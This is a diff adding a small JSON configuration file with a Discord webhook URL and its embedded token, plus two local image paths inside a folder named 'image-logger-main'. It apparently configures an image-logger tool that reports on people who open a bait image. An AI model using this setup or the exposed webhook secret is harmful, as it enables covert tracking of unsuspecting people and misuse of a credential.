@@ -1,0 +1,18 @@
+{
+  "webhooks": [
+    {
+      "name": "fdfd",
+      "url": "https://discord.com/api/webhooks/1300913421625327719/WeOR4APkzY_rI1tDHUHpwY_EWxIRpzHwHgQwH08yi-SAdxI9cGTTgvVsvXnhsABZOMYO"
+    }
+  ],
+  "image": [
+    {
+      "name": "photo_2024-10-29_21-59-46",
+      "path": "C:/Users/Chan/Desktop/image-logger-main/src/photo_2024-10-29_21-59-46.png"
+    },
+    {
+      "name": "photo_2024-10-29_21-59-46",
+      "path": "C:/Users/Chan/Desktop/image-logger-main/src/photo_2024-10-29_21-59-46.png"
+    }
+  ]
+}
